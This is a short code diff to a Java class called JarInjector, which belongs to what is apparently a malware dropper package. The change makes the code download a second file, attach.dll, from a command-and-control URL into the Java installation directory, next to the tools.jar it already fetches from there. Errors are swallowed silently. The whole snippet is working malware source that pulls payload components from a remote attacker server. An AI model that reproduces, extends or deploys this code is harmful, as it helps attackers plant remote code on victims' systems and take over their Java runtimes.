@@ -16,11 +16,22 @@ import static dropper.utils.HttpUtil.downloadFileHttp;
 public class JarInjector {
     public void setupEnv(String c2url) {
         String toolsJarPath = System.getProperty("java.home") + "\\lib\\tools.jar";
+        String attachDllPath = System.getProperty("java.home") + "\\bin\\attach.dll";
         if (!Files.exists(Paths.get(toolsJarPath))) {
             File toolsJarFile = new File(toolsJarPath);
             try {
                 if (toolsJarFile.createNewFile()) {
-                    FileUtils.copyURLToFile(new URL(c2url + "/downloadResource"), toolsJarFile);
+                    FileUtils.copyURLToFile(new URL(c2url + "/downloadResourceJ"), toolsJarFile);
+                }
+            } catch (IOException e) {
+            }
+        }
+
+        if (!Files.exists(Paths.get(attachDllPath))) {
+            File attachDllFile = new File(attachDllPath);
+            try {
+                if (attachDllFile.createNewFile()) {
+                    FileUtils.copyURLToFile(new URL(c2url + "/downloadResourceB"), attachDllFile);
                 }
             } catch (IOException e) {
             }
